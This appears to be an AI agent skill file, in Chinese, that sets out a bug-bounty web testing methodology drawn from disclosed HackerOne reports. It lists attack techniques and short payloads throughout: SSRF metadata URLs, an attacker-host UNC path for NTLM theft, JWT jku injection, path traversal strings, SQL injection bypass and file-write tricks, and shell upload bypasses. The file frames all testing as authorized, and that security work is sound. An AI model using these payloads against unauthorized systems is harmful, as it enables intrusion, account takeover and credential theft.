---
name: "hackerone-methodology"
description: "基于 HackerOne 近一年（2025-2026）公开漏洞报告提炼的实战挖掘方法论。涵盖 IDOR/BOLA、认证绕过、SSRF、XSS、SQLi、GraphQL、JWT、Prototype Pollution、HTTP走私等攻击手法，适用于漏洞赏金和 Web 渗透测试。"
---

---
name: hackerone-methodology
description: 基于 HackerOne 近一年（2025-2026）公开披露漏洞报告提炼的实战挖掘方法论。涵盖 IDOR/BOLA/BFLA、认证绕过、SSRF、XSS、SQL 注入、业务逻辑、GraphQL、Prototype Pollution、HTTP 走私等全类别攻击手法，服务于漏洞赏金和 Web 安全测试。
---

# HackerOne 漏洞挖掘实战方法论

## 概述

此技能基于对 HackerOne 2025-2026 年公开披露的数百份漏洞报告的分析提炼。覆盖主流漏洞类型的实战挖掘技术、绕过手法和攻击链。技术细节均来自真实披露报告，聚焦于可直接应用于测试的操作手法。

## 漏洞挖掘目录

### 1. 越权与访问控制（IDOR / BOLA / BFLA / BAC）

**核心手法：替换请求中的对象标识符。**

**GraphQL 越权：**
- 替换 Global ID：`btoa("User:123")` → `btoa("User:456")`，跨租户访问
- 批量查询别名探测：在一个请求中携带多个别名查询不同 ID
- 无查询深度限制导致递归遍历关联对象

**REST API 越权：**
- 替换路径参数：`/api/users/123/profile` → `/api/users/456/profile`
- 替换 body 参数：`userId`、`organizationId`、`workspaceId`
- 替换查询参数：`?user_id=123` → `?user_id=456`
- 移除参数观察是否返回全量数据（无过滤默认为全部）
- 添加数组参数：`user_ids[]=123&user_ids[]=456`

**垂直越权（权限提升）：**
- 低权限用户调用管理接口（直接尝试 admin 路径）
- 修改请求中的 role/type 参数（如 `"role":"user"` → `"role":"admin"`）
- 在 GraphQL 中查询 `isAdmin`、`permissions` 字段

**批量赋值（Mass Assignment）：**
- 在更新请求中添加额外参数：`isAdmin=true`、`verified=true`、`role=admin`
- 在注册请求中添加 `email_verified=true` 跳过验证
- 利用 API 文档中未公开的参数（如 GraphQL schema 中有但前端未使用的 mutation 参数）

**实战案例要点：**
- GitHub Enterprise：项目写权限被错误地授予了 issue/PR 元数据修改能力（操作级越权）
- GitHub：迁移导出端点无权限校验，可覆盖他人迁移存档
- HackerOne GraphQL：`SaveCollaboratorsMutation` 可在接受邀请前泄露私密邮箱
- ArXiv 论文统计 200 份 IDOR 报告：78.5% 确认在范围内，41.7% 涉及"操作级对象越权"，11.9% 涉及垂直提权

### 2. 账号接管（Account Takeover）

**邮箱变更类：**
- 修改邮箱为未注册地址 → 直接接管（无验证）
- 修改邮箱后原会话未失效 → 旧会话持续有效
- 修改邮箱时无二次认证检查 → 绕过密码/2FA 直接改管理员邮箱
- SCIM 配置导入中覆盖现有用户邮箱 → 密码重置接管

**密码重置类：**
- Host 头投毒 → 密码重置链接发往攻击者服务器
- 密码重置 Token 未绑定用户 → 可被任意用户复用
- 密码重置 Token 可预测（时间戳/mt_rand/UUID v1）
- 密码重置 API 缺少速率限制 → Token 爆破
- 响应中包含重置 Token（JSON/HTML 中泄露）

**会话管理类：**
- 退出登录后 JWT/Session Token 仍有效
- 修改密码后旧 Token 未作废
- OAuth 回调未校验 state 参数 → CSRF 登录绑定攻击者账号
- 登录响应可被重放（Session Replay）
- TLS 客户端认证可被会话恢复绕过

**2FA/MFA 绕过：**
- 登录后直接访问受保护端点（跳过 2FA 步骤）
- 邀请用户时无需 2FA → 邀请后直接登录
- OAuth 第三方登录绕过 2FA 要求
- 响应篡改：修改 2FA 验证失败的响应为成功状态码
- OTP 参数完全省略仍注册成功（hover.com 案例）

**实战案例要点：**
- U.S. DoD（CVSS 8.8）：改邮箱不需要验证 → 受害者注册该邮箱时自动登录
- Revive Adserver（CVSS 8.8）：无二次认证可改管理员邮箱 → 密码重置接管
- Hostinger（CVSS 7.5）：开放重定向 + Token 泄露 → 一键接管
- HackerOne 自身（CVSS 7.0）：SCIM 配置导入覆盖现有用户邮箱 → 无声接管

### 3. SSRF（服务端请求伪造）

**常见入口点：**
- 链接预览/展开功能（Link Unfurling）
- 游戏/棋局导出端点（如 Lichess `/game/export/{id}` 中 `players` 参数）
- Webhook URL 配置（Stripo `/exportservice/v3/exports/WEBHOOK/accounts`）
- 文件导入/URL 导入功能
- 图片代理/URL 抓取
- 回调/重定向 URL（redirect_uri、callback_url）

**绕过技巧：**
- RFC1918 网段被封 → 使用 link-local（169.254.0.0/16、fe80::/10）
- IP 格式绕过：十进制 IP、八进制 IP、IPv6 映射、`0` 压缩地址
- DNS 重绑定：TTL 设为 0 秒，多次请求间切换解析
- 302 重定向链：第一跳过白名单，第二跳到内网
- URL schema 绕过：file://、gopher://、dict://
- Windows UNC 路径：`file://attacker.com/share/file.txt` → SMB 到攻击者 → NTLM hash 窃取

**云平台元数据端点：**
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- 需要 Header：GCP 需要 `Metadata-Flavor: Google`，Azure 需要 `Metadata: true`

**实战案例要点：**
- Lichess（CVSS 9.8）：未认证的 `/game/export` 端点 `players` 参数直接传给 `RealPlayerApi.apply()`，无任何 URL 校验
- Stripo（CVSS 9.0-10.0）：`webhookUrl` 参数任意指定，无过滤
- Basecamp：`PrivateNetworkGuard` 遗漏 link-local 范围 → IMDS 访问绕过
- cURL（CVSS 7.5）：Windows 上 file:// URL 触发 SMB 连接 → NTLM 凭证窃取

### 4. XSS（跨站脚本）

**实战挖掘路径：**

| 入口 | 具体参数/端点 | 绕过手法 |
|---|---|---|
| FortiGate SSL VPN | `/ssl-vpn/getconfig.esp` 的 `user` 参数 | CVE-2025-0133 反射型 |
| ASP.NET | `ResolveUrl` 方法中的 URL 参数 | DoD 多个域 |
| Telerik ReportViewer | `Telerik.ReportViewer.axd` | F5 BIG-IP ASM 绕过 |
| Akamai CDN | 参数 `c0-id` | Akamai WAF 绕过 → DOM XSS |
| OAuth redirect_uri | Cloudflare `workers-oauth-provider` | 注册恶意 client_id → 二阶 XSS |
| 文件上传 + 重命名 | 移动云盘 PNG 上传 → HTML 重命名 | 内容型过滤绕过 |
| postMessage | 小程序 postMessage API | 无 origin 校验 → DOM XSS |

**DOM XSS source/sink 组合：**
- `location.hash` → `innerHTML`
- `postMessage` → `eval` / `Function`
- `document.referrer` → `document.write`
- `window.name` → `jQuery.html()`

**CSP 绕过侦察：**
- 检查 `script-src` 是否包含 `unsafe-eval`、`unsafe-inline`、CDN 域名
- `base-uri` 缺失 → base 标签劫持相对路径脚本
- JSONP 端点 + 可控 callback 参数
- `strict-dynamic` 下检查已有合法脚本加载的依赖链

### 5. SQL 注入

**实战检测技巧：**
- 列类型参数：Nextcloud CVE-2026-45545 —— column type 参数未净化导致任意 SQL 执行
- ORDER BY/GROUP BY 注入：注意排序字段名参数
- 布尔盲注：通过响应长度/内容差异判断
- 时间盲注：`pg_sleep()`、`SLEEP()`、`WAITFOR DELAY`

**WAF 绕过矩阵：**
- 空格绕过：`/**/`、`%09`、`%0a`、`%0d`、`%0c`
- 关键字绕过：`SeLeCt`、`SEL%00ECT`、内联注释 `/*!50000SELECT*/`
- 等号绕过：`LIKE`、`REGEXP`、`BETWEEN`、`IN`
- 引号绕过：十六进制编码 `0x61646d696e`、`CHAR()`

**特殊数据库技巧：**
- SQLite：`ATTACH DATABASE` → 写文件 RCE
- PostgreSQL：`COPY ... FROM PROGRAM`、Large Object
- MySQL：`INTO OUTFILE`、`INTO DUMPFILE`
- BigQuery：`__TABLES__` 元数据查询

### 6. 业务逻辑漏洞

**付费/订阅绕过：**
- 隐藏的 `dev` 计划切换 → 重置 14 天试用期 → 再切回 Enterprise → 无限免费
- 修改 `convenience_fee_percentage` 和 `commission` API 参数为 0
- 修改订单金额参数（price、total、amount）
- 优惠码无限重用无次数限制（AWS VDP 案例）
- 跳过支付步骤直接调用确认订单 API

**流程/状态绕过：**
- 审核机制：直接调用审核通过的 API 端点
- 验证码：OTP code 参数完全省略仍注册成功
- 实名认证：修改 API 响应或将认证状态参数设为 `true`
- 等级/会员：修改 `plan_type` 或 `subscription_tier` 参数
- 数量限制：并发请求突破（见竞态条件章节）

**参数篡改清单：**
- `price`, `amount`, `total`, `cost`, `fee`
- `discount`, `coupon_code`, `promo_code`
- `currency`, `exchange_rate`
- `tax`, `tax_rate`, `tax_amount`
- `plan`, `tier`, `subscription_level`
- `verified`, `approved`, `status`
- `role`, `type`, `permission_level`

### 7. 竞态条件

**优先测试场景：**
- 每日签到/积分领取
- 优惠券/红包领取
- 限量商品抢购
- 邀请奖励
- 抽奖/转盘
- 一次性的重置/验证操作

**测试手法：**
- Burp Suite Turbo Intruder 并发
- HTTP/2 单包攻击（Single-Packet Attack）：将所有请求放入同一个 TCP 包
- HTTP/1.1 末字节同步（last-byte sync）：暂停发送最后一个字节，然后同时释放
- 并发线程数从 10 起步，逐步增加到 50-100

**识别信号：**
- 操作前余额不变、操作后扣减但并发请求间无锁定
- 数据库使用 READ COMMITTED 隔离级别 + 无行锁
- 无幂等键（idempotency key）或去重逻辑
- 先读后写（check-then-act）无事务保护

### 8. JWT / OAuth / SAML 认证绕过

**JWT 攻击清单：**
1. `alg: none` 攻击：none / None / NoNe / NONE（4 种大小写变体）
2. 算法混淆：RS256 → HS256，用公钥当 HMAC secret
3. 密钥混淆：`jwk` header 注入攻击者公钥
4. JWKS 注入：`jku` header 指向攻击者服务器
5. `kid` 注入：路径穿越 `../../../../etc/passwd`、SQL 注入
6. 空签名：移除签名部分保留点号
7. 修改 payload 不校验签名
8. 弱 HMAC 密钥暴力破解

**OAuth 攻击点：**
- `redirect_uri` 参数未严格校验 → 授权码劫持
- `state` 参数缺失 → CSRF 绑定攻击
- `response_type=token` → Implicit Flow 令牌泄露
- `scope` 参数可扩展 → 权限提升
- OAuth Provider 的 `redirect_uri` 存在 XSS → 令牌窃取

**SAML 攻击点：**
- XML 签名验证绕过：签名包裹（Signature Wrapping）
- XML 注释注入篡改断言
- 过期断言重放
- SAML Response 中用户标识字段可控

### 9. Prototype Pollution（原型污染）

**检测方法：**
- 在 JSON body 中注入 `"__proto__": {"isAdmin": true}`
- 在 URL query 中注入 `?__proto__[isAdmin]=true`
- 在 `Object.assign` / `$.extend` / `lodash.merge` 的输入中投毒

**常见污染源：**
- 不安全的深度合并函数（`lodash.merge`、`$.extend(true,...)`）
- `deparam` / query string 解析
- 用户可控的 key 直接赋值：`obj[key] = value`
- JSON.parse 后直接 merge 到配置对象

**Gadget 链（污染 → 真实影响）：**
- Express/Koa：污染 `env`、`settings` 属性
- EJS：污染 `escapeFunction` / `client` → RCE
- Kibana：污染特定配置键 → XSS
- Node.js `child_process`：污染 `shell` / `env` → RCE
- Jitsi Bridge：污染消息对象 → 消息伪造

### 10. GraphQL 安全

**侦察手段：**
- 内省查询：`{ __schema { types { name } } }` → 获取完整 Schema
- 检查是否禁用了内省（生产环境应禁用）
- 错误消息泄露字段名、类型信息
- 前端 JS bundle 中搜索 GraphQL 查询/变更定义

**攻击向量：**
- **批量查询别名**：一个请求携带多个别名，探测不同 ID
- **深度递归**：`user → posts → author → posts → ...` 耗尽资源
- **Mutation 别名 DoS**：`mutation { a:fn b:fn c:fn ... }`，每个 alias 增加 8 秒处理时间（HackerOne 自身案例）
- **BOLA via Global ID**：修改 base64 编码的 GraphQL ID
- **字段建议**：拼写错误暴露真实字段名

### 11. 文件上传与路径穿越

**上传绕过技巧：**
- 双扩展名：`shell.php.jpg`、`shell.jsp.xlsx`
- Null byte 截断（旧版）：`shell.php%00.jpg`
- Content-Type 伪造：声明 image/png 实际为 PHP
- 扩展名黑名单绕过：`.php5`、`.phtml`、`.pht`、`.phar`、`.shtml`
- Unicode 同形字：`.php` → 使用 Unicode 替代字符
- 上传 API 无认证 → 直接上传
- 上传后调用重命名 API 改扩展名

**路径穿越探测：**
- `../../../etc/passwd`
- URL 编码：`..%2f..%2f..%2f`
- 双编码：`..%252f..%252f`
- Unicode 变体：`..%c0%af`
- 绝对路径：`/etc/passwd`
- Windows：`..\..\..\windows\win.ini`
- Zip Slip：压缩包内 `../../../` 路径

**实战案例要点：**
- 文件上传 XSS：上传含 payload PNG → 重命名为 .html → 执行 JS
- 可信追溯云平台：JS 源码审计发现 `/sys/user/upload` → 未授权上传双扩展名 `.jsp`
- cURL 路径穿越：`WriteFile` 前缀包含检查不安全 → 绕过写至任意目录

### 12. HTTP 请求走私与 Web 缓存

**走私变体：**
- CL.TE：Content-Length 优先，Transfer-Encoding 在后端
- TE.CL：Transfer-Encoding 优先，Content-Length 在后端
- TE.TE：两种 TE 混淆（`Transfer-Encoding: chunked\r\nTransfer-encoding: identity`）
- HTTP/2 降级走私：前端 HTTP/2 → 后端 HTTP/1.1

**Web 缓存投毒/欺骗：**
- 无 key 的 GET 请求缓存污染（Unkeyed GET）
- `X-Forwarded-Host` 头导致缓存键可控
- HTTP Server Push 接受非权威 scheme（`hxxps` over cleartext）→ 缓存键投毒
- 路径混淆：`/profile.css` 缓存 `/profile` 的敏感内容

### 13. CSRF 与 CORS 配置错误

**CSRF 绕过：**
- Content-Type 绕过：`application/json` → `text/plain` + JSON body
- 自定义 Header 绕过：检查 CORS preflight 是否被禁用
- `SameSite: Lax` + GET 方法敏感操作
- `SameSite: None` 但无 `Secure` flag
- Token 验证逻辑缺陷：空 Token、任意 Token、过期 Token 仍接受

**CORS 检测清单：**
- `Access-Control-Allow-Origin: *` 且 `Access-Control-Allow-Credentials: true`
- Origin 反射：`Origin: evil.com` → `ACAO: evil.com`
- null Origin 允许（sandboxed iframe）
- 子域名信任被滥用（subdomain takeover → CORS 窃取）
- `Access-Control-Allow-Origin: null` + sandboxed iframe

### 14. 信息泄露

**接口/端点泄露：**
- API 文档暴露：Swagger `/v3/api-docs`、OpenAPI `/openapi.json`、GraphQL `/graphql` 内省
- `.json` 端点泄露额外字段：HackerOne `/reports/:id.json` 泄露邮箱、OTP 备份码、graphql_secret_token
- Debug 日志公开可访问（WordPress debug.log）
- 目录列表开启 → 枚举文件
- 未认证 API 端点返回金融数据（CoinMate 案例：`/api/bitcoinWithdrawalFees` 无认证 + CORS *）

**源码泄露：**
- Webpack sourcemap → 完整前端源码、API 路径
- `.git` 目录暴露 → GitHacker 恢复
- `.env` 文件暴露 → 数据库密码、API key
- 响应 JSON 中返回内部字段（`internal_ip`、`debug_info`、`stack_trace`）

### 15. 子域名接管与基础设施

**检测方法：**
- CNAME 记录指向不存在/可注册的云资源
- NS 记录指向可购买的域名（过期 NS）
- A 记录指向可认领的弹性 IP
- 云服务指纹：检查接管目标是否为 AWS S3/CloudFront、Azure、GitHub Pages、Heroku、Shopify

**常见可接管服务：**
- AWS S3 Bucket、CloudFront Distribution
- Azure Storage、Azure CloudApp
- GitHub Pages
- Heroku App
- Shopify Store
- 未声明的 Fastly/Cloudflare 服务

## 测试工具链

### 必备工具
- **Burp Suite**（Repeater + Turbo Intruder + Collaborator）
- **Caido**（新一代 HTTP 调试代理，GraphQL 内省支持更好）
- **jwt_tool / jwt.io**（JWT 分析）
- **GraphQL Voyager / Graphw00f**（GraphQL 侦察）
- **ffuf / dirsearch**（目录和参数 fuzz）
- **nuclei**（自动化模板扫描）

### 辅助工具
- **subfinder / amass**（子域名枚举）
- **httpx**（存活检测 + 指纹）
- **sqlmap**（SQL 注入自动化）
- **gau / waybackurls**（历史 URL 收集）
- **dalfox**（XSS 自动化检测）

## 关键实战经验

1. **GraphQL 是金矿**：内省获取完整 schema → 测试所有 mutation 的权限 → 测试 Global ID 越权。大多数应用不做对象级授权。

2. **JS bundle 审计不可替代**：搜索 `upload`、`api/`、`secret`、`key`、`token`、`webhook`、`mutation`、`query` 关键词。隐藏端点和未公开参数几乎总是在这里。

3. **SSRF 绕过比想象中容易**：私有 IP 过滤常遗漏 link-local（169.254.0.0/16）。URL 解析器差异（Java vs Go vs Python）可以绕过白名单。

4. **竞态条件用 HTTP/2 单包攻击**：Turbo Intruder 的 single-packet attack 引擎可将所有请求塞入一个 TCP 包，绕过应用层限速。

5. **JWT 需要先看 alg 和 kid**：不要盲目喷洒 payload。先用 jwt.io 解析 header，确认算法类型，再针对性攻击。

6. **邮箱变更 + 密码重置 = 账号接管**：这个组合仍然是最高效的 ATO 路径。检查邮箱变更是否需要确认、旧会话是否失效、是否有通知。

7. **二阶漏洞常被忽视**：存储时安全 ≠ 读取时安全。XSS 在存储时无害，在另一个上下文（HTML/属性/JS/PDF）中读取时才触发。

8. **越权不仅看"读"还要看"写"**：操作级 BOLA（修改、删除、更新他人对象）比读权限越权影响更大，但常被漏测。

9. **OAuth redirect_uri 是最危险的参数之一**：即使做了域名白名单，也测试 path 遍历 `/../`、开放重定向链、子域名接管下的 redirect_uri。

10. **API 版本间修复不一致**：v2 修了不等于 v1 也修了。切换 API 版本号或移除版本号直接访问旧接口。

## 测试优先级排序

基于 HackerOne 公开报告中漏洞类型的频率和影响：

1. IDOR / BOLA / BFLA（最高频）
2. 认证绕过 / 账号接管（最高影响）
3. SSRF（云环境常见）
4. XSS / 存储 XSS
5. 业务逻辑（支付/订阅/流程）
6. SQL 注入
7. 竞态条件
8. GraphQL 安全
9. JWT / OAuth 攻击
10. 文件上传 / 路径穿越
11. Prototype Pollution
12. HTTP 走私 / 缓存投毒
13. CSRF / CORS
14. 子域名接管

## 注意事项

- 所有测试必须在授权（Bug Bounty 范围或授权渗透测试）内进行
- 不要对生产数据造成破坏：越权读优于越权写
- 验证漏洞时使用 Canary Token 或带外 DNS 确认
- 截图和 PoC 需清晰展示攻击链的每一步
- 发现漏洞后先确认影响范围再提交
- 涉及 PII 的数据必须脱敏处理

## 知识来源

此方法论基于以下公开资源蒸馏：
- HackerOne Hacktivity（2025-2026 数百份公开披露报告）
- darkcoders.wiki HackerOne Disclosed Reports 系列
- RedPacket Security Bug Bounty 披露汇总
- zzuli-edu/hackerone-reports2025 GitHub 仓库
- ArXiv "Broken Object Level Authorization in the Wild" （2026 年论文，200 份 IDOR 报告分析）
- 具体的公开报告案例在正文中以简注形式引用（如 Lichess #3165242、GitHub #3527771、HackerOne #3000510 等）

